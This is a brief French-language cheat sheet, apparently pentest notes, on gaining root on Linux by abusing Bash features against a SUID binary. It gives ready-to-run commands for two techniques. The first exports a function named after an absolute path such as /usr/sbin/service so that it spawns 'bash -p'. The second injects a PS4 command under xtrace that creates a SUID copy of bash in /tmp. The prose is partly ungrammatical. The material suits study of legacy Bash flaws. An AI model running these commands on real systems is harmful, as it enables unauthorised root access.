# Bash

Il est possible de définir des fonctions shell avec des noms qui ressemblent à des chemins de fichiers, puis d'exporter ces fonctions afin qu'elles soient utilisées à la place de tout exécutable réel sur ce chemin de fichier.



Vérifiez que la version de Bash installée est inférieure à 4.2-048 :

```sh
/bin/bash --version
```

**Remarque : cela ne fonctionnera pas sur les versions 4.4 et supérieures de Bash.**

Lors que un programme est executer avec son chemin absolut, verifier la version de bash

```sh
function [PROGRAM_FULL_PATH] { /bin/bash -p; }  
export -f [PROGRAM_FULL_PATH]
```

## Exemple:

L'  exécutable `/usr/local/bin/suid-env2` démarrer le serveur Web Apache2 en utilisant un chemin absolu.

- **Abusing Shell Features #1**

```
/usr/sbin/service apache2 start
```

Si la version de bash est vulnerable, alors

```sh
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```

```
/usr/local/bin/suid-env2
```

- **Abusing Shell Features #2**

En mode débogage, Bash utilise la variable d'environnement **PS4** pour afficher une invite supplémentaire pour les instructions de débogage.

```sh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

```sh
/tmp/rootbash -p
```


## Standard Path

When we have is error with gcc 

```sh
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

